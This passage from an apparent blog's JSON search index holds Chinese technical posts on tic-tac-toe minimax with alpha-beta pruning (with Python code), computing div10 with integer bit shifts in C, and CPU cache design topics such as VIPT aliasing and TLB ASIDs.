<p>\u4f5c\u4e3a\u5bf9\u6bd4\uff0c\u5b87\u5b99\u539f\u5b50\u603b\u6570\u4e0d\u8d85\u8fc7\\(10^{100}\\)\uff0c\u800c\u76ee\u524d\u8d85\u7ea7\u8ba1\u7b97\u673a\u7684\u8ba1\u7b97\u80fd\u529b\u8fd8\u672a\u8fbe\u5230 EFLOPS \u6570\u91cf\u7ea7\uff0c\u5373\u6bcf\u79d2\u8fdb\u884c\\(10^{18}\\)\u6b21\u6d6e\u70b9\u8fd0\u7b97\u3002\u53ef\u4ee5\u60f3\u8c61\uff0c\u4e0a\u9762\u7684\u6570\u91cf\u7ea7\u662f\u591a\u4e48\u9065\u4e0d\u53ef\u53ca\u7684\u5b58\u5728\u3002</p> <p>\u4e0d\u8fc7\u5e78\u597d\uff0c\u4e95\u5b57\u68cb\u7684\u53ef\u80fd\u6027\u53ea\u6709\\(9! = 362880\\)\uff0c\u91c7\u7528\u4e0a\u9762\u7684\u7b97\u6cd5\u662f\u5b8c\u5168\u53ef\u884c\u7684\u3002\u6587\u672b\u9644\u4ee3\u7801\u3002</p>","tags":["\u4e95\u5b57\u68cb","\u526a\u679d"]},{"location":"%E5%8D%9A%E5%AE%A2/2020/02/11/2020-02-11-%E4%BA%95%E5%AD%97%E6%A3%8B%E4%B8%8E%E6%9C%80%E5%A4%A7%E6%9C%80%E5%B0%8F%E5%80%BC%E7%AE%97%E6%B3%95/#alpha-beta-\u526a\u679d\u7b97\u6cd5","title":"alpha-beta \u526a\u679d\u7b97\u6cd5","text":"<p>\u4e0a\u9762\u7684\u7b97\u6cd5\u76f4\u63a5\u751f\u6210\u5b8c\u6574\u7684\u6811\uff0c\u7136\u540e\u518d\u5b8c\u6574\u904d\u5386\u4ec5\u7528\u4e8e\u8bf4\u660e\u539f\u7406\u3002\u4e8b\u5b9e\u4e0a\u6211\u4eec\u53ef\u4ee5\u5f15\u8fdb\u4e00\u4e2a Level \u53d8\u91cf\uff0c\u7528\u4e8e\u63a7\u5236\u8ba1\u7b97\u673a\u7684\u201c\u806a\u660e\u201d\u7a0b\u5ea6\u3002\u4ee5\u4e0b\u662f\u4e0d\u540c\u7684\u5730\u65b9\uff1a</p> <ol> <li>\u6811\u4e0d\u5fc5\u63d0\u524d\u751f\u6210\uff0c\u800c\u5728\u5728\u8fdb\u884c\u51b3\u7b56\u7684\u65f6\u5019\u624d\u5f80\u4e0b\u751f\u957f Level \u5c42\u3002\uff08\u51cf\u5c11\u5185\u5b58\u5f00\u9500\uff09</li> <li>\u9700\u8981\u5f15\u5165\u8bc4\u5206\u51fd\u6570\uff0c\u5408\u7406\u5730\u5bf9\u5404\u4e2a\u201c\u5f62\u52bf\u201d\u8fdb\u884c\u8bc4\u5206\u3002\u4e4b\u524d\u53ea\u5bf9\u80dc\u8d1f\u5e73\u4e09\u79cd\u60c5\u51b5\u8fdb\u884c\u4e86\u8bc4\u5206\u3002</li> <li>alpha-beta \u526a\u679d\u7b97\u6cd5\u8fdb\u884c\u641c\u7d22\u3002\u4e0d\u5fc5\u81ea\u5e95\u5411\u4e0a\u5b8c\u6574\u904d\u5386\u751f\u6210\u7684\u6811\u3002</li> </ol> <p>\u53c2\u8003\u8d44\u6599\uff1aalpha-beta \u526a\u679d\u7b97\u6cd5 - \u52a0\u5229\u798f\u5c3c\u4e9a\u5927\u5b66\u6d1b\u6749\u77f6\u5206\u6821</p>","tags":["\u4e95\u5b57\u68cb","\u526a\u679d"]},{"location":"%E5%8D%9A%E5%AE%A2/2020/02/11/2020-02-11-%E4%BA%95%E5%AD%97%E6%A3%8B%E4%B8%8E%E6%9C%80%E5%A4%A7%E6%9C%80%E5%B0%8F%E5%80%BC%E7%AE%97%E6%B3%95/#\u4e95\u5b57\u68cb-python-\u4ee3\u7801","title":"\u4e95\u5b57\u68cb python \u4ee3\u7801","text":"<p>\u5b8c\u6574\u4ee3\u7801\u4e0b\u8f7d\uff1aTicTacToe.py</p> <p>\u5173\u952e\u4ee3\u7801\uff1a</p> <pre><code>def gen_game_tree(board, choices, player):\n    '''\n    generate the all possibility game tree when the specific player play the first within the given board and choices\n    the leaf node value is the result related to the specific player: player-&gt; win, -player-&gt; lose, 0 tie\n\n    board: list, numerical board\n    choices: list, the possible move index\n    player: int, -1 or 1(not the char 'X' or 'O')\n\n    return: dict, the game tree, like {1:{...}, 2:-1, ...}\n    '''\n    if len(choices)==0:\n        return 0    # no winner\n    #DSF\n    tree = {} \n    for i in range(len(choices)):\n        #make copy\n        choices_next = choices[:]\n        board_next = board[:]\n\n        del choices_next[i]\n        makeMove(board_next, player, choices[i])\n        if isWinner(board_next, player):\n            tree[choices[i]]= player\n        else:\n            tree[choices[i]]=gen_game_tree(board_next, choices_next, -player)\n    return tree\n\ndef maxminmize(tree, isMAX):\n    '''\n    Search the tree and generate the internal-node value. since there is no Level restriction, the\n    computer will search the whole tree. So you will never win the computer in this game!!!\n\n    isMAX: bool, whether is the MAX layer. MAX mean the first player, need to maximize his value.\n           MIN mean the latter player, need to minimize the first player value.\n    '''\n    if type(tree)==int:\n        return tree\n\n    if isMAX:\n        the_max = -2 # negative infinite (compare to -1, 0, 1)\n        for move, subtree in tree.items():\n            value = maxminmize(subtree, not isMAX)\n            if value &gt; the_max:\n                the_max = value\n                the_move = move\n        tree[0]=[the_move, the_max] #since 0 is not in 1~9, use it to record the max or min value.\n    else:\n        the_min = 2 # infinite (compare to -1, 0, 1)\n        for move, subtree in tree.items():\n            value = maxminmize(subtree, not isMAX)\n            if value &lt; the_min:\n                the_min = value\n                the_move = move\n        tree[0]=[the_move, the_min] #since 0 is not in 1~9, use it to record the max or min value.\n    return tree[0][1]\n</code></pre>","tags":["\u4e95\u5b57\u68cb","\u526a\u679d"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/02/05/2022-02-05-%E4%BD%BF%E7%94%A8%E6%95%B4%E6%95%B0%E4%BD%8D%E8%BF%90%E7%AE%97%E8%AE%A1%E7%AE%97div10/","title":"\u4f7f\u7528\u6574\u6570\u4f4d\u8fd0\u7b97\u8ba1\u7b97 div10","text":"<p>\u4f7f\u7528\u6574\u6570\u4f4d\u8fd0\u7b97\u8ba1\u7b97 div10\uff0c\u5f97\u5230\u820d\u5165\u5230\u6574\u6570\u7684\u7cbe\u786e\u503c\u3002\u5f97\u5230\u4e86\u4e00\u4e2a magic number</p> <pre><code>unsigned int div10(unsigned short x){\n //return x/10\n unsigned int t = x&lt;&lt;16;\n t = (t&gt;&gt;4) + (t&gt;&gt;5);\n t = t + (t&gt;&gt;4) + (t&gt;&gt;8) + (t&gt;&gt;12) + (t&gt;&gt;16);\n\n t += 6554;  //should in [409.6, 6553.6]\n unsigned int r;\n r = t&gt;&gt;16;\n return r;\n}\n</code></pre>","tags":["div10","\u4f4d\u8fd0\u7b97"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/02/05/2022-02-05-%E4%BD%BF%E7%94%A8%E6%95%B4%E6%95%B0%E4%BD%8D%E8%BF%90%E7%AE%97%E8%AE%A1%E7%AE%97div10/#1","title":"1","text":"<p>1/10 \u4e8c\u8fdb\u5236\u5e8f\u5217\u4e3a <code>0.0001100110011...</code></p> <p>\u56e0\u6b64\u4e3b\u8981\u601d\u8def\u662f\u901a\u8fc7\u8ba1\u7b97\u4ee5\u4e0b\u7ea7\u6570\u7684\u524d\u82e5\u5e72\u9879\u6765\u83b7\u5f97\\(x \\over 10\\)\u7684\u8fd1\u4f3c\u503c\uff1a</p> \\[ {x \\over 10} = {x \\over 2^4} + {x \\over 2^5} + {x \\over 2^8} + {x \\over 2^9} + {x \\over 2^{12}} + {x \\over 2^{13}} + {x \\over 2^{16}} + {x \\over 2^{17}} +  {x \\over 2^{20}} + {x \\over 2^{21}} +... \\] <p>\u7136\u800c\u8ba1\u7b97\u4e0a\u8ff0\u5f0f\u5b50\u65f6\uff0c\u56e0\u4e3a\u6bcf\u4e00\u9879\u91c7\u7528\u7684\u662f\u6574\u6570\u53f3\u79fb\u7684\u65b9\u5f0f\uff0c\u56e0\u6b64\u6bcf\u4e00\u9879\u4fdd\u7559\u6210\u6574\u6570\u65f6\u90fd\u4f1a\u4ea7\u751f\u820d\u5165\u8bef\u5dee\uff0c\u7d2f\u52a0\u8d77\u6765\u540e\u4f1a\u4ea7\u751f\u5f88\u5927\u7684\u8bef\u5dee\u3002\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684\u4e00\u4e2a\u597d\u65b9\u6cd5\u662f\u5148\u5c06\u6574\u6570\u5de6\u79fb\u82e5\u5e72\u4f4d\u5f97\u5230\\(x^{\\prime}\\)\uff1a</p> \\[ x^{\\prime} = x &lt;&lt; k \\] <p>\u8fd9\u6837\u5c06\\(x^{\\prime}\\)\u53f3\u79fb k \u4f4d\u4ee5\u5185\u65f6\uff0c\u7ed3\u679c\u4ecd\u662f\u6574\u6570\u3002\u5c06\u6bcf\u9879\u7d2f\u52a0\u540e\uff0c\u518d\u53f3\u79fb k \u4f4d\u5373\u53ef\u8fd8\u539f\u4e3a\u539f\u672c\u7ed3\u679c\u3002</p> <p>\u6b64\u65f6\u6211\u4eec\u8ba1\u7b97\u7684\u8fc7\u7a0b\u5982\u4e0b\uff1a</p> \\[ x^{\\prime} = x &lt;&lt; k\\\\ t = \\sum_{i=1}^{n}{({x^{\\prime} \\over 2^{4i}}+{x^{\\prime} \\over 2^{4i+1}})}\\\\ r = t &gt;&gt; k \\\\ k \\ge 4n+1 \\]","tags":["div10","\u4f4d\u8fd0\u7b97"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/02/05/2022-02-05-%E4%BD%BF%E7%94%A8%E6%95%B4%E6%95%B0%E4%BD%8D%E8%BF%90%E7%AE%97%E8%AE%A1%E7%AE%97div10/#2","title":"2","text":"<p>\u63a5\u4e0b\u6765\u8981\u8003\u8651\u7cbe\u5ea6\u7684\u95ee\u9898\uff0c\u5f53\u6211\u4eec\u8ba1\u7b97 t \u65f6\uff0c\u7531\u4e8e\u622a\u65ad\u4f1a\u4ea7\u751f\u8bef\u5dee\uff0c\u53ef\u4ee5\u7b97\u5f97\uff1a</p> \\[ \\Delta = \\sum_{i=n+1}^{\\infin}{({x^{\\prime} \\over 2^{4i}}+{x^{\\prime} \\over 2^{4i+1}})}\\\\ \\Rightarrow \\Delta = {x^{\\prime} \\over 2^{4n+1}}\\cdot{1 \\over 5} \\] <p>\u5373\uff1a</p> \\[ t = {x^{\\prime} \\over 10} - \\Delta \\] <p>\u8fdb\u4e00\u6b65\u53ef\u5f97\uff1a</p> \\[ r = {x \\over 10} - {x \\over 2^{4n+1}}\\cdot{1 \\over 5} \\]","tags":["div10","\u4f4d\u8fd0\u7b97"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/02/05/2022-02-05-%E4%BD%BF%E7%94%A8%E6%95%B4%E6%95%B0%E4%BD%8D%E8%BF%90%E7%AE%97%E8%AE%A1%E7%AE%97div10/#3","title":"3","text":"<p>\u7531\u4e8e x \u662f 16 \u4f4d unsigend short \u7c7b\u578b\uff0c\u56e0\u6b64</p> \\[ 0 \\le x \\le 2^{16}-1 \\] <p>\u5f53 n \u53d6 4 \u65f6\uff0c\u53ef\u5f97 r \u4e0e x/10 \u7684\u504f\u5dee\u6700\u5927\u65f6 (x \u53d6\u6700\u5927) \u4e3a\\(0.1 - \\sigma\\)\uff0c\u5c0f\u4e8e 0.1\uff08\\(\\sigma \u662f\u7531\u4e8e x \u53d6\u4e0d\u5230 2^{16}\u5bfc\u81f4\u7684\\)\uff09</p> <p>\u7531\u4e8e r \u548c x/10 \u7684\u8bef\u5dee\u5df2\u7ecf\u5c0f\u4e8e 0.1 \u4e86\uff0c\u6613\u77e5\u5f53 x/10 \u975e\u6574\u9664\u65f6\uff0cx/10 \u548c r \u5411\u4e0b\u53d6\u6574\u5230\u540c\u4e00\u4e2a\u6574\u6570\u3002</p> <p></p>","tags":["div10","\u4f4d\u8fd0\u7b97"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/02/05/2022-02-05-%E4%BD%BF%E7%94%A8%E6%95%B4%E6%95%B0%E4%BD%8D%E8%BF%90%E7%AE%97%E8%AE%A1%E7%AE%97div10/#4","title":"4","text":"<p>\u4e0a\u9762\u7684\u65b9\u6cd5\u5728 x \u4e0d\u662f 10 \u7684\u500d\u6570\u65f6\uff0c\u5df2\u7ecf\u53ef\u4ee5\u5f97\u5230\u6b63\u786e\u7684\u503c\u4e86\u3002\u4e0d\u8fc7\u4e3a\u4e86\u5f97\u5230\u5b8c\u5168\u6b63\u786e\u7684\u7ed3\u679c\uff0c\u8fd8\u9700\u8981\u8fdb\u4e00\u6b65\u4fee\u6b63\u3002</p> <p>\u4e00\u4e2a\u601d\u8def\u662f\u5728 x \u6574\u9664 10 \u65f6\u8fdb\u884c +1 \u4fee\u6b63\uff0c\u8fd9\u91cc\u4e5f\u6709\u5f88\u591a\u9a9a\u64cd\u4f5c\u3002</p> <p>\u4e0d\u8fc7\u8fd8\u6709\u4e00\u4e2a\u66f4\u597d\u7684\u65b9\u5f0f\uff0c\u662f\u5bf9\u8ba1\u7b97\u51fa\u7684 r \u589e\u52a0\u4e00\u4e2a\u504f\u79fb\uff1a</p> \\[ r^{\\prime} = r + \\delta \\] <p>\u4f7f\u4e4b\u6ee1\u8db3\uff1a</p> \\[ {x \\over 10} \\le r^{\\prime}&lt; {x \\over 10}+0.1 \\] <p>\u8fd9\u6837\u4fbf\u53ef\u4ee5\u4fdd\u8bc1\\(r^{\\prime}\\)\u5411\u4e0b\u53d6\u6574\u540e\u53d6\u5f97\u6b63\u786e\u7684\u503c\u3002</p> <p>\u4ee3\u5165 r \u7684\u5f0f\u5b50\u8ba1\u7b97\u540e\u5f97\uff1a</p> \\[ {x \\over 2^{4n+1}}\\cdot{1 \\over 5} \\le \\delta \\lt {1 \\over 10} + {x \\over 2^{4n+1}}\\cdot{1 \\over 5} \\] <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u4e0a\u5f0f\u8981\u5bf9\u4efb\u610f\u7684 x \u90fd\u6210\u7acb\u7684\u3002</p> <p>\u5f53 x=0 \u65f6\uff0c\u53ef\u4ee5\u5f97\u5230\\(\\delta\\)\u7684\u4e0a\u754c\uff0c\u800c\\(\\delta\\)\u7684\u4e0b\u754c\u7531 x \u7684\u6700\u5927\u503c\u786e\u5b9a\uff0c\u53ef\u5f97\uff1a</p> \\[ {2^{16} - 1 \\over 2^{4n+1}}\\cdot{1 \\over 5} \\le \\delta \\lt {1 \\over 10} \\] <p>\u4e8b\u5b9e\u4e0a\u5bf9\\(r\\)\u6dfb\u52a0\u504f\u79fb\u662f\u4e3a\u4e86\u6613\u4e8e\u8bf4\u660e\uff0c\u5b9e\u9645\u4e0a\u6211\u4eec\u662f\u5728\u8ba1\u7b97\u5f97\u5230\u7684\u6574\u6570\\(t\\)\u200b\u200b\u200b\u4e0a\u589e\u52a0\u4e00\u4e2a\u6574\u6570\u504f\u79fb\uff1a</p> \\[ t^{\\prime} = t + \\delta \\] <p>\u7531\u4e0a\u9762\u7684\u5206\u6790\uff0c\u53ef\u5f97\u4e0b\u5f0f\uff0c\u5176\u4e2d\\(\\delta\\)\u53d6\u6574\u6570\uff1a</p> \\[ {2^{16} - 1 \\over 2^{4n+1}}\\cdot{1 \\over 5}*2^{16} \\le \\delta \\lt {1 \\over 10}*2^{16} \\] <p>\u53ef\u4ee5\u53d1\u73b0\uff0c\u5f53 n=4 \u65f6\uff0c\\(\\delta\\)\u65e0\u6574\u6570\u89e3</p> <p>\u6240\u4ee5 n \u9700\u8981\u53d6 5 \u4ee5\u4e0a\uff0c\u5f53 n=5 \u65f6\uff0c\u5f97\uff1a</p> \\[ 409.59375 \\le \\delta \\lt 6553.6 \\] <p>\u6700\u540e\u7684\u8ba1\u7b97\u8fc7\u7a0b\u4e3a\uff1a</p> \\[ x^{\\prime} = x &lt;&lt;16\\\\ t = \\sum_{i=1}^{5}{({x^{\\prime} \\over 2^{4i}}+{x^{\\prime} \\over 2^{4i+1}})} + 410\\\\ r = t &gt;&gt; 16 \\\\ \\] <p>\u867d\u7136 n=5 \u65f6\uff0c\u5de6\u79fb 16 \u4f4d\uff0c\u5e76\u4e0d\u80fd\u4fdd\u8bc1\u8ba1\u7b97 t \u7684\u8fc7\u7a0b\u4e2d\uff0c\u6ca1\u6709\u820d\u5165\u8bef\u5dee\uff0c\u597d\u5728\u8be5\u8bef\u5dee\u6bd4\u8f83\u5c0f\uff0c\u5bf9\u6700\u540e\u7ed3\u679c\u6ca1\u6709\u9020\u6210\u592a\u5927\u5f71\u54cd\u3002\u7ecf\u5b9e\u9a8c\u540e\uff0c\u5b9e\u9645\u6700\u540e\u7684\\(\\delta\\)\u53d6\u503c\u53ef\u4e3a\\([410, 6554]\\)\uff0c\u548c\u7406\u8bba\u5206\u6790\u4ec5\u5dee 1\u3002</p>","tags":["div10","\u4f4d\u8fd0\u7b97"]},{"location":"%E5%8D%9A%E5%AE%A2/2023/09/01/2023-09-01-%E5%86%8D%E6%AC%A1%E7%90%86%E8%A7%A3Cache%E8%AE%BE%E8%AE%A1/","title":"\u518d\u6b21\u7406\u89e3 Cache \u8bbe\u8ba1","text":"<p>\u6d89\u53ca\u865a\u62df cache \u5bfc\u81f4\u7684\u540c\u540d\u548c\u91cd\u540d\u95ee\u9898\uff1b\u91cd\u540d\u95ee\u9898 bank \u548c L2 \u4e24\u79cd\u89e3\u51b3\u65b9\u6cd5\uff1b\u8fdb\u7a0b\u5207\u6362\u65f6 TLB \u7684\u64cd\u4f5c\uff1b\u4ec0\u4e48\u65f6\u5019\u9700\u8981\u663e\u793a\u5730\u63a7\u5236 cache \u7b49\u3002</p>","tags":["cpu","cache","VIPT"]},{"location":"%E5%8D%9A%E5%AE%A2/2023/09/01/2023-09-01-%E5%86%8D%E6%AC%A1%E7%90%86%E8%A7%A3Cache%E8%AE%BE%E8%AE%A1/#\u865a\u62df-cache-\u7684\u95ee\u9898","title":"\u865a\u62df cache \u7684\u95ee\u9898","text":"<p>\u8fd9\u91cc\u7684\u865a\u62df cache \u6307\u7684\u662f virtual index, virtual tag</p> <p>\u865a\u62df cache \u4f4d\u4e8e cpu \u548c tlb \u4e4b\u95f4\uff0c\u7531\u4e8e cache \u547d\u4e2d\u5c31\u4e0d\u9700\u8981 tlb \u5730\u5740\u6620\u5c04\uff0c\u56e0\u6b64\u4e0d\u4f1a\u5bf9 CPU \u9891\u7387\u9020\u6210\u8d1f\u9762\u5f71\u54cd\u3002</p> <p></p> <p></p>","tags":["cpu","cache","VIPT"]},{"location":"%E5%8D%9A%E5%AE%A2/2023/09/01/2023-09-01-%E5%86%8D%E6%AC%A1%E7%90%86%E8%A7%A3Cache%E8%AE%BE%E8%AE%A1/#\u540c\u540d\u95ee\u9898-homonyms","title":"\u540c\u540d\u95ee\u9898 (homonyms)","text":"<p>\u4e0d\u540c\u8fdb\u7a0b\u6709\u7740\u72ec\u7acb\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\uff0c\u76f8\u540c\u7684\u865a\u62df\u5730\u5740\u5bf9\u5e94\u4e0d\u540c\u7684\u7269\u7406\u5730\u5740\u3002</p> <p>\u8fdb\u7a0b\u5207\u6362\u65f6\uff0c\u7531\u4e8e cache \u4e2d\u91c7\u7528 virtual tag\uff0c\u56e0\u6b64\u53ef\u80fd\u4ece cache \u4e2d\u8bfb\u53d6\u5230\u5176\u5b83\u8fdb\u7a0b\u7684\u503c\u3002\uff08\u7269\u7406 cache \u6ca1\u6709\u8fd9\u4e2a\u95ee\u9898\uff09</p> <p>\u89e3\u51b3\u65b9\u6cd5\uff1a\u53ef\u80fd\u53ea\u80fd\u901a\u8fc7\u624b\u52a8\u65e0\u6548\u6389 cache \u6765\u89e3\u51b3\u3002</p>","tags":["cpu","cache","VIPT"]},{"location":"%E5%8D%9A%E5%AE%A2/2023/09/01/2023-09-01-%E5%86%8D%E6%AC%A1%E7%90%86%E8%A7%A3Cache%E8%AE%BE%E8%AE%A1/#\u91cd\u540d\u95ee\u9898-alias","title":"\u91cd\u540d\u95ee\u9898 (alias)","text":"<p>\u64cd\u4f5c\u7cfb\u7edf\u4f7f\u7528\u865a\u62df\u5730\u5740\u6620\u5c04\u5b9e\u73b0\u5171\u4eab\u5185\u5b58\uff08\u4e0d\u540c\u865a\u62df\u5730\u5740 VA1,VA2\uff0c\u6620\u5c04\u5230\u76f8\u540c\u7269\u7406\u5730\u5740 PA\uff09 \u5982\u679c\u91c7\u7528\u865a\u62df\u7d22\u5f15\uff08virtual index\uff09\uff0c\u4f1a\u5e26\u6765\u91cd\u540d\u95ee\u9898\uff1a\u4e0d\u540c\u865a\u62df\u5730\u5740 VA1,VA2\uff0c\u6620\u5c04\u5230\u76f8\u540c\u7269\u7406\u5730\u5740 PA\uff0c\u4f46\u662f\u6620\u5c04\u5230\u4e0d\u540c cache set</p> <ul> <li>\u4e00\u4efd\u6570\u636e\u88ab\u5b58\u50a8\u4e86\u4e24\u904d</li> <li>\u5e76\u4e14\u4fee\u6539\u5176\u4e2d\u4e00\u4e2a\u6570\u636e\u4e0d\u4f1a\u81ea\u52a8\u4fee\u6539\u53e6\u4e00\u4e2a</li> </ul> <p></p>","tags":["cpu","cache","VIPT"]},{"location":"%E5%8D%9A%E5%AE%A2/2023/09/01/2023-09-01-%E5%86%8D%E6%AC%A1%E7%90%86%E8%A7%A3Cache%E8%AE%BE%E8%AE%A1/#vipt","title":"VIPT","text":"<p>VIPT \u662f\u4e00\u79cd\u5e76\u884c\u4e86 TLB \u548c cache \u8bbf\u95ee\u7684\u5b9e\u73b0\u65b9\u6cd5\uff0c\u88ab\u5e7f\u6cdb\u4f7f\u7528\u3002\u5229\u7528\u4e86\u865a\u62df\u5730\u5740\u5230\u7269\u7406\u5730\u5740 offset \u90e8\u5206\u662f\u4e0d\u53d8\u7684\u7279\u70b9\u3002</p> <ul> <li>index \u2264 offset \u65f6\u7b49\u4ef7\u4e8e PIPT\uff0c\u4e0d\u540c\u7684\u662f\u8bbf\u95ee TLB \u548c\u7d22\u5f15 cache line \u53ef\u4ee5\u5e76\u884c</li> <li>index &gt; offset \u662f\u624d\u662f virtual index\uff0c\u4e14 virtual index = {a, offset}\uff0c\u53ea\u6709 a \u90e8\u5206\u662f\u865a\u62df\u7684</li> </ul> <p></p> <p>\u5982\u679c\u8981\u6c42 index &lt;= offset \u7684\u8bdd\uff0c\u5219 cache \u4e00\u8def\u7684\u5927\u5c0f\u88ab\u9650\u5236\u4e3a\u6700\u5927\u4e00\u9875\u7684\u5927\u5c0f\uff08\u6bd4\u5982 4KB\uff09\uff0c\u589e\u5927 cache \u7684\u5927\u5c0f\u53ea\u80fd\u589e\u52a0\u7ec4\u76f8\u8054\u5ea6\u3002</p> <p>\u800c\u91cd\u540d\u95ee\u9898\u53ea\u8981\u662f\u91c7\u7528\u865a\u62df\u7d22\u5f15\u5c31\u4f1a\u5b58\u5728\u3002\u56e0\u6b64 VIPT \u5f53 index &gt; offset \u65f6\uff0c\u4e5f\u4f1a\u5b58\u5728\u91cd\u540d\u95ee\u9898\u3002\u56e0\u6b64\u89e3\u51b3\u91cd\u540d\u95ee\u9898\u975e\u5e38\u91cd\u8981\u3002</p>","tags":["cpu","cache","VIPT"]},{"location":"%E5%8D%9A%E5%AE%A2/2023/09/01/2023-09-01-%E5%86%8D%E6%AC%A1%E7%90%86%E8%A7%A3Cache%E8%AE%BE%E8%AE%A1/#\u91cd\u540d\u89e3\u51b3\u65b9\u6cd5","title":"\u91cd\u540d\u89e3\u51b3\u65b9\u6cd5","text":"<p>\u6709\u4e24\u79cd\u89e3\u51b3\u91cd\u540d\u7684\u65b9\u6cd5</p> <ul> <li>bank \u65b9\u6cd5\u672c\u8d28\u8fd8\u662f\u5c06 VIPT \u8f6c\u6362\u4e58 PIPT</li> <li>L2 \u5171\u4eab cache \u7684\u65b9\u6cd5\u5219\u901a\u8fc7 L2 \u6765\u5224\u65ad L1 \u662f\u5426\u53d1\u751f\u4e86\u91cd\u540d\uff0c\u7136\u540e\u65e0\u6548\u6389\u91cd\u540d\u90e8\u5206</li> </ul>","tags":["cpu","cache","VIPT"]},{"location":"%E5%8D%9A%E5%AE%A2/2023/09/01/2023-09-01-%E5%86%8D%E6%AC%A1%E7%90%86%E8%A7%A3Cache%E8%AE%BE%E8%AE%A1/#\u4f7f\u7528-bank-\u89e3\u51b3","title":"\u4f7f\u7528 bank \u89e3\u51b3","text":"<ul> <li>\u56fe\u4e2d\u76f4\u63a5\u6620\u5c04 cache \u5927\u5c0f\u4e3a 8k\uff0c\u9875\u5927\u5c0f\u4e3a 4k\u3002index -offset = 1\u3002\u4e00\u4e2a\u7269\u7406\u5730\u5740\u6700\u591a\u53ef\u80fd\u51fa\u73b0\u5728\u4e24\u4e2a cache line</li> <li>\u4f7f\u7528 VIPT \u7684\u597d\u5904\u4fbf\u662f\u80fd\u591f\u5e76\u884c\u8bbf\u95ee TLB \u548c cache\u3002\u5982\u679c virtual index &gt; page offset \u4f4d\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u628a\u6240\u6709\u53ef\u80fd\u7684 physical index \u90fd\u8bfb\u51fa\u6765\uff08\u4f7f\u7528 bank \u5e76\u884c\uff09\uff0c\u7136\u540e\u518d\u6839\u636e TLB \u7ffb\u8bd1\u7684\u7ed3\u679c\u591a\u8def\u9009\u62e9\u3002\u8fd9\u6837\u672c\u8d28\u4e0a\u53c8\u56de\u5230\u4e86 PIPT\u3002<ul> <li>cache \u7684 tag \u548c data \u9700\u8981\u5206\u5f00\u5b58\u50a8\uff0c\u5199\u5165\u65f6\uff0c\u5148\u8bfb\u53d6 tag\uff0c\u547d\u4e2d\u540e\uff0c\u518d\u5199 data \u90e8\u5206\u3002</li> </ul> </li> <li>\u53e6\u4e00\u4e2a\u7406\u89e3\uff1a\u76f8\u5f53\u4e8e PFN 12 \u4f4d\u4e3a 0 \u7684\u5199\u5165 bank0\uff0c\u4e3a 1 \u7684\u5199\u5165 bank1\u3002\u7269\u7406\u5730\u5740\u662f\u786e\u5b9a\u7684\uff0c\u56e0\u6b64\u4e0d\u4f1a\u53d1\u751f\u91cd\u540d\u3002 </li> </ul>","tags":["cpu","cache","VIPT"]},{"location":"%E5%8D%9A%E5%AE%A2/2023/09/01/2023-09-01-%E5%86%8D%E6%AC%A1%E7%90%86%E8%A7%A3Cache%E8%AE%BE%E8%AE%A1/#\u4f7f\u7528-l2-cache-\u89e3\u51b3","title":"\u4f7f\u7528 L2 cache \u89e3\u51b3","text":"<p>\u4f7f\u7528 L2 inclusive cache \u89e3\u51b3\u865a\u62df cache \u91cd\u540d\u95ee\u9898\u3002</p> <ul> <li>\u601d\u8def\uff1aL1 cache \u4e2d\u91cd\u540d\u7684\u7684\u865a\u62df\u5730\u5740\uff0c\u53ea\u5b58\u50a8\u4e00\u4efd\uff0c\u53e6\u4e00\u4e2a\u65e0\u6548\u6389 \u8fc7\u7a0b</li> <li>VA2 \u8bbf\u95ee L1 \u5982\u679c\u7f3a\u5931\uff0c\u5219 PA \u8bbf\u95ee L2\uff08\u4f7f\u7528 PIPT\uff09</li> <li>L2 \u4e2d\u5982\u679c\u5df2\u7ecf\u5b58\u5728 PA \u7684\u6570\u636e\uff0c\u5219\u8868\u793a L1 \u53ef\u80fd\u5b58\u5728\u91cd\u540d\u3002<ul> <li>L2 \u9664\u4e86\u6b63\u5e38\u7684 physical tag\uff0c\u8fd8\u9700\u8981\u5b58\u50a8 L1 \u4e2d VA \u7684 a\u3002\u5982\u679c VA2 \u7684 a \u548c\u5b58\u50a8\u7684 a \u4e0d\u540c\uff0c\u5219\u8868\u793a L1 \u5b58\u5728\u91cd\u540d\u7684 cache line</li> </ul> </li> <li>\u91cd\u540d\u7684\u8bdd\uff0c\u5c06 L1 \u4e2d\u7684 VA1\uff08a+offset\uff09cache line \u7f6e\u4e3a\u65e0\u6548</li> </ul> <p></p>","tags":["cpu","cache","VIPT"]},{"location":"%E5%8D%9A%E5%AE%A2/2023/09/01/2023-09-01-%E5%86%8D%E6%AC%A1%E7%90%86%E8%A7%A3Cache%E8%AE%BE%E8%AE%A1/#tlb-asid-cache-\u63a7\u5236\u6307\u4ee4","title":"TLB ASID, cache \u63a7\u5236\u6307\u4ee4","text":"","tags":["cpu","cache","VIPT"]},{"location":"%E5%8D%9A%E5%AE%A2/2023/09/01/2023-09-01-%E5%86%8D%E6%AC%A1%E7%90%86%E8%A7%A3Cache%E8%AE%BE%E8%AE%A1/#tlb-asid","title":"TLB ASID","text":"<p>\u8fdb\u7a0b\u5207\u6362\u65f6\uff0c\u4f1a\u5207\u6362\u9875\u8868\u3002\u4f46\u662f TLB \u4e2d\u4ecd\u7136\u4fdd\u5b58\u7740\u6570\u636e\uff0c\u56e0\u6b64\u53ef\u80fd\u4f1a\u9519\u8bef\u547d\u4e2d\u3002</p> <p>TLB \u4e2d\u7f13\u5b58\u7740\u9875\u8868\u9879\uff08\u865a\u62df\u9875\u53f7\u5230\u7269\u7406\u9875\u53f7\u7684\u6620\u5c04\uff09\uff0c\u5f53\u8fdb\u7a0b\u5207\u6362\u540e\uff0c\u7406\u8bba\u4e0a\u9700\u8981\u6e05\u7a7a TLB\uff0c\u53ef\u80fd\u6d6a\u8d39\u4e86\u6709\u7528\u7684\u503c\u3002 \u4e3a\u4e86\u89e3\u51b3\u4f4e\u6548\u7684\u6e05\u7a7a\u64cd\u4f5c\uff0c\u5f15\u5165\u4e86 ASID</p> 